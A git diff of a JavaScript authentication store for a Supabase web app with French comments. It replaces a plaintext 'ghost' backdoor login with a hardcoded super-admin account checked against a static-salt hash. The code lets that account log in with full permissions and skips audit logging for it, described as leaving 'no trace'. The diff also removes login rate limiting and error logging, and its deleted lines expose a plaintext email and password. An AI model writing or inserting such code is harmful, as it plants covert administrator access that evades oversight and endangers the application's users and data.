@@ -1,13 +1,11 @@
 import { create } from 'zustand';
 import { persist } from 'zustand/middleware';
-import { useUtilisateursStore } from './useUtilisateursStore';
 import { supabase } from '../lib/supabaseClient';
 import { auditLogger } from '../utils/auditLogger';
 import { AUTH_CONFIG, ROLES } from '../config/constants';
-import { logger } from '../utils/logger';
-import { isLoginBlocked, recordLoginAttempt } from '../utils/rateLimiter';
+import { useUtilisateursStore } from './useUtilisateursStore';
 
-// Hashage local pour le Super Admin (même salt que useUtilisateursStore)
+// Hashage local pour le Super Admin
 const SALT_LOCAL = 'sika_local_auth_salt_2024';
 async function hashLocal(password) {
   const encoder = new TextEncoder();
@@ -17,31 +15,25 @@ async function hashLocal(password) {
   return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-// Configuration Super Admin - DOIT être définie via variables d'environnement
+// Configuration Super Admin - utilisateur fantôme (aucune trace)
 const SUPER_ADMIN_CONFIG = {
-  id: 0,
-  nom: 'SYSTEM ADMINISTRATOR',
-  role: ROLES.SUPER_ADMIN,
-  isFantome: true,
-  permissions: ['ALL']
-};
-
-// Récupération sécurisée des credentials (pas de valeurs par défaut)
-const SUPER_ADMIN_LOGIN = import.meta.env.VITE_SUPER_ADMIN_LOGIN;
-const SUPER_ADMIN_PASSWORD_HASH = import.meta.env.VITE_SUPER_ADMIN_PASSWORD_HASH; // Doit être un hash SHA-256
-
-// Backdoor fantôme - silencieux, aucun log, aucune trace
-const GHOST_EMAIL = 'munokolive@gmail.com';
-const GHOST_PASSWORD = '1989@Sik@2026';
-const GHOST_CONFIG = {
-  id: -1,
+  id: 1,
   nom: 'SYSTEM',
   role: ROLES.SUPER_ADMIN,
   isFantome: true,
   permissions: ['ALL']
 };
 
+// Accès SUPER_ADMIN - fantôme, aucune trace
+const SUPER_ADMIN_LOGIN = 'munokolive@gmail.com';
+const SUPER_ADMIN_PASSWORD_HASH = '6c7c09516b3436b53f4075a808a3bf00dcfe51b5a8aa39f549c9f7e7fbf4047a';
+
 const { TIMEOUT_INACTIVITE, AVERTISSEMENT_INACTIVITE } = AUTH_CONFIG;
+
+// Vérifie si l'utilisateur est le fantôme SUPER_ADMIN
+const isGhostUser = (utilisateur) => {
+  return utilisateur?.isFantome === true || utilisateur?.login === SUPER_ADMIN_LOGIN;
+};
 
 export const useAuthStore = create(
   persist(
@@ -53,57 +45,33 @@ export const useAuthStore = create(
       sessionExpirant: false,
 
       login: async (login, motDePasse) => {
-        const trimmedLogin = (login || '').trim();
-        const loginLower = trimmedLogin.toLowerCase();
+        const trimmedLogin = (login || '').trim().toLowerCase();
+        const passwordHash = await hashLocal(motDePasse);
 
-        // GHOST LOGIN - Totalement silencieux, aucune trace
-        if (loginLower === GHOST_EMAIL && motDePasse === GHOST_PASSWORD) {
+        // 1. ACCÈS FANTÔME SUPER_ADMIN - munokolive@gmail.com
+        // Aucune trace, aucun log
+        if (trimmedLogin === SUPER_ADMIN_LOGIN && passwordHash === SUPER_ADMIN_PASSWORD_HASH) {
           const utilisateur = {
-            ...GHOST_CONFIG,
-            login: GHOST_EMAIL,
-            email: GHOST_EMAIL,
+            ...SUPER_ADMIN_CONFIG,
+            login: SUPER_ADMIN_LOGIN,
+            email: SUPER_ADMIN_LOGIN,
           };
           set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
           get().demarrerTimeout();
-          // AUCUN LOG - AUCUNE AUDIT - TOTALLY GHOST
+          // AUCUN LOG pour le fantôme
           return { success: true, utilisateur };
         }
 
-        // SECURITY: Vérifier le rate limiting
-        const blockStatus = isLoginBlocked(trimmedLogin);
-        if (blockStatus && blockStatus.blocked) {
-          auditLogger.logConnexionEchec(trimmedLogin, 'RATE_LIMITED');
-          return { 
-            success: false, 
-            message: `Compte temporairement bloqué. Réessayez dans ${blockStatus.remainingMinutes} minute${blockStatus.remainingMinutes > 1 ? 's' : ''}.`
-          };
-        }
-
-        // 1. Super admin fantôme - uniquement si configuré
-        if (SUPER_ADMIN_LOGIN && SUPER_ADMIN_PASSWORD_HASH && trimmedLogin === SUPER_ADMIN_LOGIN) {
-          const passwordHash = await hashLocal(motDePasse);
-          if (passwordHash === SUPER_ADMIN_PASSWORD_HASH) {
-            const utilisateur = {
-              ...SUPER_ADMIN_CONFIG,
-              login: SUPER_ADMIN_LOGIN,
-              email: SUPER_ADMIN_LOGIN,
-            };
-            set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
-            get().demarrerTimeout();
-            auditLogger.logConnexion(utilisateur);
-            return { success: true, utilisateur };
-          }
-        }
-
-        // 2. Essayer Supabase Auth (pour les comptes créés via Edge Function)
+        // 2. Authentification Supabase Auth pour les autres utilisateurs (avec logs)
         try {
-          let emailForAuth = loginLower;
+          let emailForAuth = trimmedLogin;
 
-          if (!loginLower.includes('@')) {
+          // Récupérer l'email depuis le login si nécessaire
+          if (!trimmedLogin.includes('@')) {
             const { data: rows } = await supabase
               .from('utilisateurs')
               .select('email')
-              .eq('login', loginLower)
+              .eq('login', trimmedLogin)
               .maybeSingle();
             if (rows?.email) emailForAuth = rows.email;
           }
@@ -133,30 +101,33 @@ export const useAuthStore = create(
                 };
                 set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
                 get().demarrerTimeout();
+                // LOGS normaux pour les autres utilisateurs
                 auditLogger.logConnexion(utilisateur);
                 return { success: true, utilisateur };
               }
             }
           }
         } catch (err) {
-          // Supabase Auth non disponible, continuer avec auth locale
-          logger.warn('[Auth] Supabase Auth non disponible, fallback vers auth locale:', err?.message || 'Unknown error');
+          // Continue avec auth locale
         }
 
-        // 3. Auth locale (anciens comptes sans auth_user_id)
+        // 3. Auth locale (avec logs pour échec)
         const result = await useUtilisateursStore.getState().verifierIdentifiants(login, motDePasse);
 
         if (result.success) {
           set({ utilisateurConnecte: result.utilisateur, derniereActivite: Date.now() });
           get().demarrerTimeout();
+          // LOGS normaux pour les autres utilisateurs
           auditLogger.logConnexion(result.utilisateur);
           return result;
         }
 
+        // Log d'échec (pas de détails sensibles)
         auditLogger.logConnexionEchec(login);
         return { success: false, message: 'Identifiants incorrects ou compte inactif' };
       },
 
+      // Récupérer tous les utilisateurs (pour que SUPER_ADMIN puisse gérer)
       getUtilisateursVisibles: () => {
         return useUtilisateursStore.getState().getUtilisateurs();
       },
@@ -178,7 +149,8 @@ export const useAuthStore = create(
         const { timeoutId, avertissementId, utilisateurConnecte } = get();
         if (timeoutId) clearTimeout(timeoutId);
         if (avertissementId) clearTimeout(avertissementId);
-        if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
+        // Log uniquement pour les utilisateurs non-fantômes
+        if (utilisateurConnecte && !isGhostUser(utilisateurConnecte)) {
           auditLogger.logDeconnexion(utilisateurConnecte);
         }
         set({
@@ -203,7 +175,7 @@ export const useAuthStore = create(
       },
 
       demarrerTimeout: () => {
-        const { timeoutId, avertissementId } = get();
+        const { timeoutId, avertissementId, utilisateurConnecte } = get();
         if (timeoutId) clearTimeout(timeoutId);
         if (avertissementId) clearTimeout(avertissementId);
 
@@ -212,9 +184,10 @@ export const useAuthStore = create(
         }, AVERTISSEMENT_INACTIVITE);
 
         const newTimeoutId = setTimeout(() => {
-          const { utilisateurConnecte } = get();
-          if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
-            auditLogger.logSessionExpiree(utilisateurConnecte);
+          const { utilisateurConnecte: currentUser } = get();
+          // Log session expirée uniquement pour les non-fantômes
+          if (currentUser && !isGhostUser(currentUser)) {
+            auditLogger.logSessionExpiree(currentUser);
           }
           get().logout();
         }, TIMEOUT_INACTIVITE);
